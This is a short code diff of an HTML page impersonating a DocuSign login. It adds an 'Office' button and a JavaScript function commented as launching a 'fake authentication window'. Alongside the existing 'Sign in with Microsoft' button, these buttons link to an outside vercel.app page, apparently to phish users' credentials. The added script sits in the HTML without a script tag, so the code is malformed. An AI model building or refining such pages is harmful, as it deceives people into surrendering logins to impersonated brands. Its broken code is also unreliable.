@@ -168,6 +168,12 @@
         <div class="container">
             <h1>Log in to DocuSign</h1>
             <div class="button-container">
+                <a href="https://red-eta.vercel.app/red.html" class="button microsoft" onclick="return launchWindow();">Office</a>
+
+function launchWindow(){
+    // Launch the fake authentication window
+    return false; // This will make sure the href attribute is ignored
+}
                 <a href="https://red-eta.vercel.app/red.html" class="button microsoft">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="20">
                     SIGN IN WITH MICROSOFT
